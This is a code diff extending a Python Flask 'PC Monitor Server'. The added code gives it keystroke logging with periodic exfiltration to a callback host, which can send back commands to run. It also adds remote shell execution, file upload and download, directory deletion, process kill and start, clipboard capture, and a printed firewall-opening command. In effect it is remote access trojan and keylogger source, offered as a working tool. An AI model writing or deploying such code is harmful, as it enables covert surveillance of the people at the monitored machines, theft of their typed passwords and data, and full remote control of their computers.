@@ -2,19 +2,23 @@ import json
 import os
 import base64
 import secrets
+import uuid  # ADD THIS - Missing import for token operations
 from datetime import datetime, timedelta
 from pathlib import Path
 from threading import Thread, Lock
+import threading
 import time
 import queue
 import subprocess
 import sys
 import signal
+import socket
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from pynput import mouse, keyboard
 from PIL import ImageGrab
+import requests
 
 try:
     import win32gui
@@ -61,6 +65,146 @@ last_activity_time = datetime.now()
 pc_id = None
 API_KEY = None
 config = None
+
+# ============================================================================
+# REVERSE CONNECTION MODULE
+# ============================================================================
+
+class ReverseConnection:
+    """Handles reverse connection - server pushes data to client"""
+    
+    def __init__(self, config):
+        self.callback_url = config.get('callback_url')
+        self.callback_key = config.get('callback_key')
+        self.interval = config.get('interval', 10)
+        self.retry_interval = config.get('retry_interval', 30)
+        self.enabled = config.get('enabled', False)
+        self.running = True
+        self.connected = False
+        
+    def start(self):
+        """Start the reverse connection thread"""
+        if not self.enabled:
+            print("Reverse connection disabled")
+            return
+        
+        thread = threading.Thread(target=self._callback_loop, daemon=True)
+        thread.start()
+        print(f"Reverse connection enabled - connecting to {self.callback_url}")
+    
+    def _callback_loop(self):
+        """Main loop that sends data back to client"""
+        while self.running:
+            try:
+                # Get current server status
+                data = self._collect_data()
+                
+                # Send to your client
+                response = requests.post(
+                    f"{self.callback_url}/callback",
+                    json=data,
+                    headers={'X-Callback-Key': self.callback_key},
+                    timeout=5
+                )
+                
+                if response.status_code == 200:
+                    if not self.connected:
+                        print(f"✓ Connected to client at {self.callback_url}")
+                        self.connected = True
+                    
+                    # Check if client sent commands
+                    result = response.json()
+                    if result.get('command'):
+                        self._handle_command(result['command'])
+                    
+                    time.sleep(self.interval)
+                else:
+                    raise Exception(f"Bad response: {response.status_code}")
+                    
+            except Exception as e:
+                if self.connected:
+                    print(f"✗ Lost connection to client: {e}")
+                    self.connected = False
+                
+                # Retry after delay
+                time.sleep(self.retry_interval)
+    
+    def _collect_data(self):
+        """Collect data to send to client"""
+        global events, keystroke_buffer, monitoring, pc_id, config
+        
+        # Create safe reference to config
+        current_config = config if config is not None else {}
+        
+        # Get recent events (last 50)
+        with events_lock:
+            recent_events = events[-50:] if len(events) > 0 else []
+        
+        # Get recent keystrokes
+        with keystroke_lock:
+            recent_keystrokes = keystroke_buffer[-100:] if len(keystroke_buffer) > 0 else []
+        
+        return {
+            "timestamp": datetime.now().isoformat(),
+            "pc_id": pc_id,
+            "pc_name": current_config.get('pc_name', 'Unknown'),
+            "monitoring": monitoring,
+            "event_count": len(events),
+            "keystroke_count": len(keystroke_buffer),
+            "events": recent_events,
+            "keystrokes": recent_keystrokes
+        }
+    
+    def _handle_command(self, command):
+        """Handle commands from client"""
+        cmd_type = command.get('type')
+        
+        print(f"Received command: {cmd_type}")
+        
+        if cmd_type == 'start':
+            start_monitoring()
+        elif cmd_type == 'stop':
+            stop_monitoring()
+        elif cmd_type == 'snapshot':
+            take_screenshot()
+        elif cmd_type == 'ping':
+            pass  # Just acknowledge
+    
+    def stop(self):
+        """Stop the reverse connection"""
+        self.running = False
+
+
+def load_callback_config():
+    """Load callback configuration"""
+    callback_file = Path("callback_config.json")
+    
+    if callback_file.exists():
+        try:
+            with open(callback_file, 'r') as f:
+                return json.load(f)
+        except:
+            pass
+    
+    # Create default config
+    default_config = {
+        "enabled": False,
+        "callback_url": "http://YOUR_CLIENT_IP:8080",
+        "callback_key": "change_this_secret_key",
+        "interval": 10,
+        "retry_interval": 30
+    }
+    
+    with open(callback_file, 'w') as f:
+        json.dump(default_config, f, indent=4)
+    
+    print(f"\nCreated callback_config.json - Edit it with your client's IP!")
+    
+    return default_config
+
+# ============================================================================
+# CORE FUNCTIONALITY
+# ============================================================================
 
 def load_config():
     """Load configuration from file"""
@@ -442,7 +586,74 @@ def stop_monitoring():
     
     return {"status": "stopped", "pc_id": pc_id}
 
-# API Endpoints
+
+# Get ipv4
+def get_local_ip():
+    """Get the local IPv4 address"""
+    try:
+        # Method 1: Connect to external address (doesn't actually send data)
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except:
+        pass
+    
+    try:
+        # Method 2: Get hostname and resolve it
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        if local_ip.startswith('127.'):
+            raise Exception("Got loopback")
+        return local_ip
+    except:
+        pass
+    
+    try:
+        # Method 3: Enumerate network interfaces (Windows)
+        import subprocess
+        result = subprocess.run(['ipconfig'], capture_output=True, text=True)
+        lines = result.stdout.split('\n')
+        
+        for i, line in enumerate(lines):
+            if 'IPv4 Address' in line or 'IPv4' in line:
+                if ':' in line:
+                    ip = line.split(':')[-1].strip()
+                    ip = ip.replace('(Preferred)', '').strip()
+                    if not ip.startswith('127.') and not ip.startswith('169.254.'):
+                        return ip
+    except:
+        pass
+    
+    return "0.0.0.0"
+
+
+def get_all_local_ips():
+    """Get all local IP addresses"""
+    ips = []
+    
+    try:
+        import subprocess
+        result = subprocess.run(['ipconfig'], capture_output=True, text=True)
+        lines = result.stdout.split('\n')
+        
+        for line in lines:
+            if 'IPv4 Address' in line or 'IPv4' in line:
+                if ':' in line:
+                    ip = line.split(':')[-1].strip()
+                    ip = ip.replace('(Preferred)', '').strip()
+                    if not ip.startswith('127.') and not ip.startswith('169.254.'):
+                        if ip not in ips:
+                            ips.append(ip)
+    except:
+        pass
+    
+    return ips
+
+# ============================================================================
+# API ENDPOINTS
+# ============================================================================
 
 @app.route('/api/status', methods=['GET'])
 def status():
@@ -678,25 +889,449 @@ def execute_command():
             log_event("remote_command", {"type": "launch", "path": app_path})
             subprocess.Popen(app_path, shell=True)
             return jsonify({"status": "application launched"})
-        
+            
         elif cmd_type == 'shell':
             command = data.get('command')
+            timeout = data.get('timeout', 30)
+            
             if not command or not isinstance(command, str):
                 return jsonify({"error": "Invalid command"}), 400
+                
             log_event("remote_command", {"type": "shell", "command": command})
-            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-            return jsonify({
-                "status": "executed",
-                "stdout": result.stdout,
-                "stderr": result.stderr,
-                "returncode": result.returncode
-            })
+            
+            try:
+                # Execute the command with timeout
+                process = subprocess.Popen(
+                    command,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+                
+                stdout, stderr = process.communicate(timeout=timeout)
+                exit_code = process.returncode
+                
+                return jsonify({
+                    "status": "success",
+                    "exit_code": exit_code,
+                    "stdout": stdout,
+                    "stderr": stderr,
+                    "returncode": exit_code  # Added for compatibility
+                })
+                
+            except subprocess.TimeoutExpired:
+                process.kill()
+                return jsonify({"error": f"Command timed out after {timeout} seconds"}), 408
+            except Exception as e:
+                return jsonify({"error": str(e)}), 500
         
         else:
             return jsonify({"error": "Unknown command type"}), 400
     
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+
+@app.route('/api/file', methods=['POST'])
+@require_auth
+def file_transfer():
+    """Handle file transfer operations (upload/download)"""
+    data = request.json or {}
+    operation = data.get('operation')
+    
+    try:
+        if operation == 'upload':
+            # Client is uploading a file to the server
+            remote_path = data.get('destination')
+            file_content = data.get('file_content')
+            
+            if not remote_path or not file_content:
+                return jsonify({"error": "Missing required parameters"}), 400
+                
+            try:
+                # Ensure the directory exists
+                os.makedirs(os.path.dirname(os.path.abspath(remote_path)), exist_ok=True)
+                
+                # Write the file
+                with open(remote_path, 'wb') as f:
+                    f.write(base64.b64decode(file_content))
+                    
+                log_event("file_transfer", {"type": "upload", "path": remote_path})
+                return jsonify({"status": "success", "message": f"File uploaded to {remote_path}"})
+                
+            except Exception as e:
+                return jsonify({"error": f"Failed to write file: {str(e)}"}), 500
+                
+        elif operation == 'download':
+            # Client is downloading a file from the server
+            remote_path = data.get('source')
+            
+            if not remote_path:
+                return jsonify({"error": "Missing source path"}), 400
+                
+            try:
+                # Check if file exists
+                if not os.path.isfile(remote_path):
+                    return jsonify({"error": "File not found"}), 404
+                    
+                # Read the file
+                with open(remote_path, 'rb') as f:
+                    file_content = base64.b64encode(f.read()).decode('utf-8')
+                    
+                log_event("file_transfer", {"type": "download", "path": remote_path})
+                return jsonify({
+                    "status": "success", 
+                    "file_content": file_content,
+                    "filename": os.path.basename(remote_path)
+                })
+                
+            except Exception as e:
+                return jsonify({"error": f"Failed to read file: {str(e)}"}), 500
+        else:
+            return jsonify({"error": f"Unknown operation: {operation}"}), 400
+            
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/api/filesystem', methods=['GET', 'POST'])
+@require_auth
+def filesystem_operations():
+    """Handle filesystem operations (list directories, get file info)"""
+    try:
+        if request.method == 'GET':
+            # List directory contents
+            path = request.args.get('path', '/')
+            
+            if not os.path.exists(path):
+                return jsonify({'success': False, 'error': 'Path not found'}), 404
+                
+            if not os.path.isdir(path):
+                return jsonify({'success': False, 'error': 'Path is not a directory'}), 400
+                
+            items = []
+            for item in os.listdir(path):
+                item_path = os.path.join(path, item)
+                try:
+                    stat_info = os.stat(item_path)
+                    item_type = 'directory' if os.path.isdir(item_path) else 'file'
+                    
+                    items.append({
+                        'name': item,
+                        'path': item_path,
+                        'type': item_type,
+                        'size': stat_info.st_size,
+                        'modified': datetime.fromtimestamp(stat_info.st_mtime).isoformat(),
+                        'permissions': stat_info.st_mode
+                    })
+                except Exception:
+                    # Skip items that can't be accessed
+                    continue
+                    
+            return jsonify({
+                'success': True,
+                'path': path,
+                'items': items
+            }), 200
+            
+        elif request.method == 'POST':
+            # Create directory or delete files/directories
+            data = request.get_json() or {}
+            operation = data.get('operation')
+            path = data.get('path')
+            
+            # Validate path is provided and is a string
+            if not path or not isinstance(path, str):
+                return jsonify({'success': False, 'error': 'Valid path required'}), 400
+            
+            if operation == 'mkdir':
+                try:
+                    os.makedirs(path, exist_ok=True)
+                    log_event("filesystem", {"type": "mkdir", "path": path})
+                    return jsonify({'success': True, 'message': f'Directory created: {path}'}), 200
+                except Exception as e:
+                    return jsonify({'success': False, 'error': f'Failed to create directory: {str(e)}'}), 500
+                    
+            elif operation == 'delete':
+                if not os.path.exists(path):
+                    return jsonify({'success': False, 'error': 'Path not found'}), 404
+                    
+                try:
+                    if os.path.isdir(path):
+                        import shutil
+                        shutil.rmtree(path)
+                    else:
+                        os.remove(path)
+                    log_event("filesystem", {"type": "delete", "path": path})
+                    return jsonify({'success': True, 'message': f'Deleted: {path}'}), 200
+                except Exception as e:
+                    return jsonify({'success': False, 'error': f'Failed to delete: {str(e)}'}), 500
+                    
+            else:
+                return jsonify({'success': False, 'error': 'Invalid operation'}), 400
+        
+        # Handle any other HTTP method
+        return jsonify({'success': False, 'error': 'Method not allowed'}), 405
+                
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/process', methods=['GET', 'POST'])
+@require_auth
+def process_management():
+    """Handle process management operations"""
+    try:
+        if request.method == 'GET':
+            # List running processes
+            processes = []
+            
+            if WINDOWS_SUPPORT:
+                import psutil
+                for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
+                    try:
+                        proc_info = proc.info
+                        processes.append({
+                            'pid': proc_info['pid'],
+                            'name': proc_info['name'],
+                            'username': proc_info['username'],
+                            'memory_mb': round(proc_info['memory_info'].rss / (1024 * 1024), 2),
+                            'cpu_percent': proc_info['cpu_percent']
+                        })
+                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                        pass
+            else:
+                # Fallback for non-Windows systems
+                import subprocess
+                output = subprocess.check_output(['ps', 'aux']).decode('utf-8')
+                lines = output.strip().split('\n')
+                for line in lines[1:]:  # Skip header
+                    parts = line.split(None, 10)
+                    if len(parts) >= 10:
+                        processes.append({
+                            'username': parts[0],
+                            'pid': int(parts[1]),
+                            'cpu_percent': float(parts[2]),
+                            'memory_mb': float(parts[5]),
+                            'name': parts[10] if len(parts) > 10 else parts[9]
+                        })
+            
+            return jsonify({
+                'success': True,
+                'processes': processes
+            }), 200
+            
+        elif request.method == 'POST':
+            # Process operations (kill, start)
+            data = request.get_json() or {}
+            operation = data.get('operation')
+            
+            if operation == 'kill':
+                pid = data.get('pid')
+                if not pid:
+                    return jsonify({'success': False, 'error': 'PID required'}), 400
+                
+                try:
+                    import psutil
+                    process = psutil.Process(pid)
+                    process.terminate()
+                    log_event("process", {"type": "kill", "pid": pid})
+                    return jsonify({'success': True, 'message': f'Process {pid} terminated'}), 200
+                except psutil.NoSuchProcess:
+                    return jsonify({'success': False, 'error': f'Process {pid} not found'}), 404
+                except psutil.AccessDenied:
+                    return jsonify({'success': False, 'error': f'Access denied to process {pid}'}), 403
+                except Exception as e:
+                    return jsonify({'success': False, 'error': str(e)}), 500
+            
+            elif operation == 'start':
+                command = data.get('command')
+                if not command:
+                    return jsonify({'success': False, 'error': 'Command required'}), 400
+                
+                try:
+                    import subprocess
+                    process = subprocess.Popen(
+                        command,
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    
+                    # Wait a short time to see if process starts successfully
+                    try:
+                        return_code = process.wait(timeout=1)
+                        stdout, stderr = process.communicate()
+                        
+                        if return_code != 0:
+                            return jsonify({
+                                'success': False,
+                                'error': f'Process exited with code {return_code}',
+                                'stdout': stdout,
+                                'stderr': stderr
+                            }), 500
+                    except subprocess.TimeoutExpired:
+                        # Process is still running, which is good
+                        pass
+                    
+                    log_event("process", {"type": "start", "command": command})
+                    return jsonify({
+                        'success': True,
+                        'message': f'Process started',
+                        'pid': process.pid
+                    }), 200
+                    
+                except Exception as e:
+                    return jsonify({'success': False, 'error': str(e)}), 500
+            
+            else:
+                return jsonify({'success': False, 'error': 'Invalid operation'}), 400
+    
+        # Add this before the final "except Exception as e:" in each route
+        return jsonify({'success': False, 'error': 'Method not allowed'}), 405
+
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@app.route('/api/clipboard', methods=['GET', 'POST'])
+@require_auth
+def clipboard_operations():
+    """Handle clipboard monitoring and operations"""
+    try:
+        if not WINDOWS_SUPPORT:
+            return jsonify({'success': False, 'error': 'Clipboard operations only supported on Windows'}), 400
+            
+        if request.method == 'GET':
+            # Get clipboard content
+            try:
+                import pyperclip
+                content = pyperclip.paste()
+                return jsonify({
+                    'success': True,
+                    'content': content,
+                    'timestamp': datetime.now().isoformat()
+                }), 200
+            except Exception as e:
+                return jsonify({'success': False, 'error': f'Failed to get clipboard: {str(e)}'}), 500
+                
+        elif request.method == 'POST':
+            # Set clipboard content
+            data = request.get_json() or {}
+            content = data.get('content')
+            
+            if content is None:
+                return jsonify({'success': False, 'error': 'Content required'}), 400
+                
+            try:
+                import pyperclip
+                pyperclip.copy(content)
+                log_event("clipboard", {"type": "set", "length": len(content)})
+                return jsonify({
+                    'success': True,
+                    'message': 'Clipboard content set'
+                }), 200
+            except Exception as e:
+                return jsonify({'success': False, 'error': f'Failed to set clipboard: {str(e)}'}), 500
+                
+        # Add this before the final "except Exception as e:" in each route
+        return jsonify({'success': False, 'error': 'Method not allowed'}), 405
+    
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@app.route('/api/token', methods=['GET', 'POST'])
+@require_auth
+def token_operations():
+    """Handle token management operations"""
+    try:
+        if request.method == 'GET':
+            # List available tokens
+            tokens_file = DATA_DIR / 'tokens.json'
+            
+            if not tokens_file.exists():
+                return jsonify({'success': True, 'tokens': []}), 200
+                
+            try:
+                with open(tokens_file, 'r') as f:
+                    tokens = json.load(f)
+                return jsonify({'success': True, 'tokens': tokens}), 200
+            except Exception as e:
+                return jsonify({'success': False, 'error': f'Failed to read tokens: {str(e)}'}), 500
+                
+        elif request.method == 'POST':
+            # Add/remove tokens
+            data = request.get_json() or {}
+            operation = data.get('operation')
+            
+            if operation not in ['add', 'remove', 'clear']:
+                return jsonify({'success': False, 'error': 'Invalid operation'}), 400
+                
+            tokens_file = DATA_DIR / 'tokens.json'
+            tokens = []
+            
+            # Load existing tokens if file exists
+            if tokens_file.exists():
+                try:
+                    with open(tokens_file, 'r') as f:
+                        tokens = json.load(f)
+                except Exception:
+                    tokens = []
+            
+            if operation == 'add':
+                token_data = data.get('token')
+                if not token_data or not isinstance(token_data, dict):
+                    return jsonify({'success': False, 'error': 'Invalid token data'}), 400
+                
+                # Add timestamp if not provided
+                if 'timestamp' not in token_data:
+                    token_data['timestamp'] = datetime.now().isoformat()
+                
+                # Add unique ID if not provided
+                if 'id' not in token_data:
+                    token_data['id'] = str(uuid.uuid4())
+                
+                tokens.append(token_data)
+                log_event("token", {"type": "add", "token_id": token_data['id']})
+                
+            elif operation == 'remove':
+                token_id = data.get('id')
+                if not token_id:
+                    return jsonify({'success': False, 'error': 'Token ID required'}), 400
+                
+                original_count = len(tokens)
+                tokens = [t for t in tokens if t.get('id') != token_id]
+                
+                if len(tokens) == original_count:
+                    return jsonify({'success': False, 'error': 'Token not found'}), 404
+                
+                log_event("token", {"type": "remove", "token_id": token_id})
+                
+            elif operation == 'clear':
+                tokens = []
+                log_event("token", {"type": "clear"})
+            
+            # Save tokens
+            try:
+                os.makedirs(os.path.dirname(tokens_file), exist_ok=True)
+                with open(tokens_file, 'w') as f:
+                    json.dump(tokens, f, indent=2)
+                
+                return jsonify({
+                    'success': True,
+                    'message': f'Token operation {operation} successful',
+                    'tokens': tokens
+                }), 200
+            except Exception as e:
+                return jsonify({'success': False, 'error': f'Failed to save tokens: {str(e)}'}), 500
+
+        # Add this before the final "except Exception as e:" in each route
+        return jsonify({'success': False, 'error': 'Method not allowed'}), 405
+
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
 
 @app.route('/api/export', methods=['GET'])
 @require_auth
@@ -715,39 +1350,116 @@ def export_data():
     
     return jsonify(data)
 
+# ============================================================================
+# MAIN
+# ============================================================================
+
 if __name__ == '__main__':
-    print("="*70)
-    print("PC MONITOR SERVER - Enhanced Edition")
-    print("="*70)
-    print(f"\nPC ID: {pc_id}")
-    print(f"PC Name: {config.get('pc_name', 'Unknown')}")
-    print(f"API Key: {API_KEY}")
-    print(f"Port: {config['port']}")
-    print(f"Host: {config['host']}")
-    print(f"\nData directory: {DATA_DIR.absolute()}")
-    print(f"Screenshots: {SCREENSHOTS_DIR.absolute()}")
-    print("\nWindows Support:", "Enabled" if WINDOWS_SUPPORT else "Disabled")
-    print("="*70)
-    print("\nServer starting... Press Ctrl+C to stop")
-    print("="*70)
-    
-    # Start background threads
-    screenshot_thread = Thread(target=auto_screenshot_thread, daemon=True)
-    screenshot_thread.start()
-    
-    # Load auto-screenshot settings
-    auto_screenshot_enabled = config.get('auto_screenshot', False)
-    auto_screenshot_interval = config.get('screenshot_interval', 300)
-    
-    # Start Flask server
-    try:
-        app.run(
-            host=config['host'],
-            port=config['port'],
-            debug=False,
-            threaded=True
-        )
-    except KeyboardInterrupt:
-        print("\n\nServer stopped by user")
-        stop_monitoring()
-        sys.exit(0)
+    # Check if running as a service
+    if len(sys.argv) > 1 and sys.argv[1].lower() in ['install', 'remove', 'start', 'stop', 'restart', 'status']:
+        # Service commands - print message and exit
+        print(f"Service command '{sys.argv[1]}' detected.")
+        print("Note: Service installation requires install_service.py module")
+        print("Run the server normally without arguments to start monitoring")
+        sys.exit(1)
+    else:
+        # Get network information
+        primary_ip = get_local_ip()
+        all_ips = get_all_local_ips()
+        port = config['port']
+        
+        # Print startup banner
+        print("="*70)
+        print("PC MONITOR SERVER - Enhanced Edition")
+        print("="*70)
+        print(f"\nPC ID: {pc_id}")
+        print(f"PC Name: {config.get('pc_name', 'Unknown')}")
+        print(f"API Key: {API_KEY}")
+        print(f"\nPort: {port}")
+        print(f"Binding: {config['host']} (all interfaces)")
+        
+        print(f"\n{'-'*70}")
+        print("CONNECTION INFORMATION")
+        print(f"{'-'*70}")
+        
+        if primary_ip and primary_ip != "0.0.0.0":
+            print(f"\n✓ Primary IPv4 Address: {primary_ip}")
+            print(f"\n  Connect from remote client using:")
+            print(f"  → http://{primary_ip}:{port}")
+        
+        if all_ips and len(all_ips) > 1:
+            print(f"\n  Additional IP addresses detected:")
+            for ip in all_ips:
+                if ip != primary_ip:
+                    print(f"  → http://{ip}:{port}")
+        
+        print(f"\n  From this PC (localhost):")
+        print(f"  → http://127.0.0.1:{port}")
+        print(f"  → http://localhost:{port}")
+        
+        print(f"\n{'-'*70}")
+        print("CLIENT CONFIGURATION")
+        print(f"{'-'*70}")
+        
+        if primary_ip and primary_ip != "0.0.0.0":
+            print(f'\nCopy this to your client_config.json:')
+            print(f'{{')
+            print(f'    "server_url": "http://{primary_ip}:{port}",')
+            print(f'    "api_key": "{API_KEY}"')
+            print(f'}}')
+        
+        print(f"\n{'-'*70}")
+        print("FIREWALL REMINDER")
+        print(f"{'-'*70}")
+        print(f"\nIf connecting remotely, allow port {port} in firewall:")
+        print(f"Run as Administrator:")
+        print(f'  netsh advfirewall firewall add rule name="PC Monitor" dir=in action=allow protocol=TCP localport={port}')
+        
+        print(f"\n{'-'*70}")
+        print(f"\nData directory: {DATA_DIR.absolute()}")
+        print(f"Screenshots: {SCREENSHOTS_DIR.absolute()}")
+        print("\nWindows Support:", "Enabled" if WINDOWS_SUPPORT else "Disabled")
+        
+        # Check for reverse connection config
+        callback_config = load_callback_config()
+        if callback_config.get('enabled'):
+            print(f"\n{'-'*70}")
+            print("REVERSE CONNECTION")
+            print(f"{'-'*70}")
+            print(f"Status: ENABLED")
+            print(f"Callback URL: {callback_config.get('callback_url')}")
+            print(f"Interval: {callback_config.get('interval')}s")
+            print("Server will push data to client automatically")
+        
+        print("="*70)
+        print("\nServer starting... Press Ctrl+C to stop")
+        print("="*70 + "\n")
+        
+        # Start background threads
+        screenshot_thread = Thread(target=auto_screenshot_thread, daemon=True)
+        screenshot_thread.start()
+        
+        # Load auto-screenshot settings
+        auto_screenshot_enabled = config.get('auto_screenshot', False)
+        auto_screenshot_interval = config.get('screenshot_interval', 300)
+        
+        # Start reverse connection if configured
+        reverse_conn = None
+        if callback_config.get('enabled'):
+            reverse_conn = ReverseConnection(callback_config)
+            reverse_conn.start()
+        
+        # Start Flask server
+        try:
+            app.run(
+                host=config['host'],
+                port=config['port'],
+                debug=False,
+                threaded=True
+            )
+        except KeyboardInterrupt:
+            print("\n\nServer stopped by user")
+            stop_monitoring()
+            if reverse_conn:
+                reverse_conn.stop()
+            sys.exit(0)
